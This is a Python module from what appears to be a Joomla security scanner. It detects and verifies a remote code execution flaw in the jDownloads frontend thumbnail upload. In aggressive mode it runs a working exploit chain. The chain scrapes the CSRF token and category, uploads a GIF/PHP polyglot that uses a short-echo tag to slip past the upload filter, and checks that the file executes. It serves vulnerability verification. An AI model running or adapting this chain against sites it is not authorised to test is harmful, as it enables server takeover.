from __future__ import annotations

import re
import secrets
from typing import Any
from urllib.parse import urljoin

from ...core.args import aggressive_value
from ...core.http import (
    HttpClient,
    build_multipart,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-117551"
NAME = "jDownloads frontend thumbnail upload RCE"
COMPONENT = "jDownloads"
AFFECTED_RULE = "jDownloads 1.0.0 through 4.1.7; fixed in 4.1.8"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
FORM_PATH = "/index.php?option=com_jdownloads&view=form&layout=edit"
TOKEN_RE = re.compile(r'name="([a-f0-9]{32})" value="1"')
FORM_ACTION_RE = re.compile(r'<form[^>]+action="([^"]+)"', re.IGNORECASE)
CATID_QUERY_RE = re.compile(r"[?&]catid=(\d+)")
CAT_DIR_ORG_RE = re.compile(r'name="cat_dir_org"[^>]*value="(\d+)"')
CATID_OPTION_RE = re.compile(r'name="jform\[catid\]".*?</select>', re.IGNORECASE | re.DOTALL)
OPTION_RE = re.compile(r'<option[^>]+value="(\d+)"')
GIF_1X1 = bytes.fromhex("47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b")


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    numeric = _numeric_version(version)
    parsed = parse_version_safe(numeric)
    fixed = parse_version_safe("4.1.8")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("jdownloads", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="jDownloads was not detected.", action="No action is required unless jDownloads is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected jDownloads {version}, within the affected range below 4.1.8."
        action = "Upgrade jDownloads to 4.1.8 or newer and review frontend thumbnail uploads."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected jDownloads {version}, which includes the 4.1.8 thumbnail-extension fix."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "jDownloads was detected, but its version could not be determined."
        action = "Determine the installed jDownloads version and upgrade to 4.1.8 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _discover_form_url(base: str, form_url: str | None, catid: str | None, timeout: int, proxy: str | None) -> str | None:
    if form_url:
        return form_url if form_url.startswith(("http://", "https://")) else urljoin(base + "/", form_url)
    if "option=com_jdownloads" in base and "view=form" in base:
        return base
    if catid:
        return f"{base}{FORM_PATH}&catid={catid}"
    client = HttpClient(timeout=timeout, proxy=proxy)
    page = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(page):
        return None
    match = re.search(r'href="([^"]*option=com_jdownloads[^"]*view=form[^"]*)"', page.get("body") or "", re.IGNORECASE)
    return urljoin(base + "/", match.group(1).replace("&amp;", "&")) if match else None


def _form_token(body: str) -> str | None:
    start = body.find('id="adminForm"')
    window = body[start:] if start >= 0 else body
    match = TOKEN_RE.search(window)
    return match.group(1) if match else None


def _form_catid(body: str, form_url: str) -> str | None:
    query = CATID_QUERY_RE.search(form_url)
    if query:
        return query.group(1)
    hidden = CAT_DIR_ORG_RE.search(body)
    if hidden:
        return hidden.group(1)
    select = CATID_OPTION_RE.search(body)
    if select:
        option = OPTION_RE.search(select.group(0))
        if option:
            return option.group(1)
    return None


def run_aggressive_probe(
    target_url: str,
    form_url: str | None = None,
    catid: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Upload a valid image/PHP polyglot through the frontend thumbnail field.

    jDownloads 4.1.7 only processes the thumbnail array when more than one
    file is submitted (``$sum > 1``), so the probe sends a benign GIF plus a
    GIF/PHP polyglot named ``*.php``. The 4.1.7 scan blocks literal ``<?php``
    but not the short-echo form, so the payload uses ``<?=print(marker)?>``.
    The marker is inert; no shell command or site data is touched.
    """
    base = normalize_url(target_url)
    resolved_form = _discover_form_url(base, form_url, catid, timeout, proxy)
    if not resolved_form:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/", detail="No jDownloads frontend upload form could be discovered on the target.", action="Point the probe at a page that exposes the jDownloads upload form, or pass --aggressive-arg form_url=... / catid=... on an authorized staging site.")

    client = HttpClient(timeout=timeout, proxy=proxy)
    page = client.get(resolved_form, timeout=timeout)
    if is_transport_error(page):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=resolved_form, detail=f"The upload form could not be reached ({transport_error_detail(page)}).", action="Retry when the target is reachable.")
    body = page.get("body") or ""
    if "file_upload_thumb" not in body:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=resolved_form, detail="The jDownloads upload form did not expose the thumbnail field (login or upload permission may be required).", action="Use an account with upload permission and point the probe at the form URL.")

    token = _form_token(body)
    resolved_catid = _form_catid(body, resolved_form)
    if not token or not resolved_catid:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=resolved_form, detail="The upload form did not expose a CSRF token or category id.", action="Verify the form and category permissions on an authorized staging site.")

    action = FORM_ACTION_RE.search(body)
    action_url = urljoin(base + "/", action.group(1).replace("&amp;", "&")) if action else f"{base}/index.php?option=com_jdownloads&task=download.save"
    marker = f"PROOFCMS_JD_RCE_{secrets.token_hex(4)}"
    filename = f"proofcms_{secrets.token_hex(4)}.php"
    polyglot = GIF_1X1 + f"<?=print('{marker}')?>".encode()

    fields = {
        "jform[title]": f"ProofCMS JD {secrets.token_hex(3)}",
        "jform[catid]": resolved_catid,
        "task": "download.save",
        "view": "form",
        "image_file_count": "1",
        "cat_dir_org": resolved_catid,
        "sum_listed_images": "0",
        "max_sum_images": "3",
        "submitted_by": "0",
        "set_aup_points": "0",
        token: "1",
    }
    files = {
        "file_upload_thumb[0]": ("proofcms_benign.gif", GIF_1X1, "image/gif"),
        "file_upload_thumb[1]": (filename, polyglot, "image/png"),
    }
    content_type, payload = build_multipart(fields, files)
    upload = client.request(action_url, method="POST", headers={"Content-Type": content_type}, data=payload, timeout=timeout, follow_redirects=False)
    if is_transport_error(upload):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=action_url, detail=f"The thumbnail upload failed in transit ({transport_error_detail(upload)}).", action="Retry when the target is reachable.")

    file_url = f"{base}/images/jdownloads/screenshots/{filename}"
    served = client.get(file_url, timeout=timeout)
    executed = not is_transport_error(served) and served.get("status") == 200 and marker in (served.get("body") or "")
    evidence = {
        "form_url": resolved_form,
        "catid": resolved_catid,
        "upload_status": upload.get("status"),
        "filename": filename,
        "file_url": file_url,
        "marker": marker,
        "marker_executed": executed,
        "cleanup_attempted": False,
    }
    if executed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=file_url,
            evidence=evidence,
            detail=(
                f"The frontend thumbnail upload accepted the GIF/PHP polyglot {filename!r} and the "
                "uploaded file executed, printing the inert marker. The 4.1.7 scan blocks literal "
                "'<?php' but not the short-echo form used by the payload."
            ),
            action="Upgrade jDownloads to 4.1.8 or newer and remove the uploaded file from images/jdownloads/screenshots/.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=file_url,
        evidence=evidence,
        detail=f"The upload response was HTTP {upload.get('status')}, but the polyglot did not execute at the expected public path (served HTTP {served.get('status') if not is_transport_error(served) else 0}).",
        action="Upgrade affected jDownloads versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    form_url = _discover_form_url(base, None, None, timeout, proxy)
    if not form_url:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/", detail="No jDownloads frontend upload form was found; the thumbnail surface is absent.", action="Verify whether jDownloads is installed and whether frontend uploads are enabled.")
    response = HttpClient(timeout=timeout, proxy=proxy).get(form_url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=form_url, detail=f"The upload form could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    if "file_upload_thumb" in (response.get("body") or ""):
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=form_url, detail="The frontend thumbnail upload form is reachable; the state-changing polyglot proof was not sent in safe mode.", action="Use aggressive mode on an authorized staging site to verify the upload validation.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=form_url, detail="The upload form did not expose the thumbnail field; no proof was attempted.", action="Verify frontend upload permissions on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN", "INCONCLUSIVE"}:
            passive.detail += " Aggressive proof skipped because jDownloads was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            form_url=aggressive_value(aggressive_args, aggressive_command, "form_url"),
            catid=aggressive_value(aggressive_args, aggressive_command, "catid"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (form reachability) and aggressive (thumbnail polyglot) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Remote Code Execution", "module_version": "1.0.0", "last_reviewed": "2026-11-15", "updated": "2026-11-15", "required_detectors": ["jdownloads"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-117551", "https://github.com/advisories/GHSA-px9q-qw3v-wg6c", "https://www.jdownloads.com/"]}
